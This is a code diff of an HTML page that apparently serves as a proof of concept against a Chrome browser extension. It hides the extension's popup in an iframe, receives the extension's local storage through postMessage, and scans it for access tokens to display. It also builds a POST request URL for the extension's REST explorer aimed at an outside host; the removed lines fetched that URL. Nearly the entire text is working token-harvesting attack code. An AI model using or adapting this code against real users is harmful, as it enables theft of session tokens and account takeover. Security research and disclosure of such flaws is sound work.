@@ -5,15 +5,20 @@
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
         #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
-        #restExplorer { margin-top: 20px; }
+        pre { margin: 10px 0; white-space: pre-wrap; }
         .token { color: #2e7d32; }
         .message { color: #1976d2; }
-        #requestDetails { margin-top: 20px; padding: 15px; background: #fff; border: 1px solid #ddd; }
+        #urlDisplay { 
+            margin-top: 20px;
+            padding: 15px;
+            background: #e3f2fd;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
     <div id="messages"></div>
-    <div id="requestDetails"></div>
+    <div id="urlDisplay"></div>
     <script>
         function displayMessage(label, msg) {
             const pre = document.createElement('pre');
@@ -22,35 +27,34 @@
             document.getElementById('messages').appendChild(pre);
         }
 
-        async function makeRequest(url) {
-            try {
-                const response = await fetch(url);
-                const requestDetails = document.getElementById('requestDetails');
-                requestDetails.innerHTML = `
-                    <h3>Request Headers:</h3>
-                    <pre>${JSON.stringify(Object.fromEntries([...response.headers]), null, 2)}</pre>
-                    <h3>Status:</h3>
-                    <pre>${response.status} ${response.statusText}</pre>
-                `;
-            } catch (error) {
-                displayMessage('Error', error);
-            }
-        }
-
         window.addEventListener('message', function(event) {
             if (event.data.insextInitRequest) {
                 displayMessage('Init Request', event.data);
                 
                 const storage = event.data.iFrameLocalStorage;
-                const firstHost = Object.keys(storage)[0];
+                // Display access tokens
+                for (let host in storage) {
+                    if (storage[host].includes('access_token')) {
+                        displayMessage('Access Token Found', `Host: ${host}\nStorage: ${storage[host]}`);
+                    }
+                }
                 
+                // Get first host and construct URL (but don't navigate to it)
+                const firstHost = Object.keys(storage)[0];
                 if (firstHost) {
                     const url = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/rest-explore.html?host=${firstHost}&method=POST&endpoint=samanattar.github.io`;
-                    makeRequest(url);
+                    
+                    // Display the URL instead of navigating to it
+                    const urlDiv = document.getElementById('urlDisplay');
+                    urlDiv.innerHTML = `
+                        <h3>Constructed URL:</h3>
+                        <pre>${url}</pre>
+                    `;
                 }
             }
         });
 
+        // Initial iframe for getting localStorage data
         const initFrame = document.createElement('iframe');
         initFrame.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html`;
         initFrame.style.display = 'none';
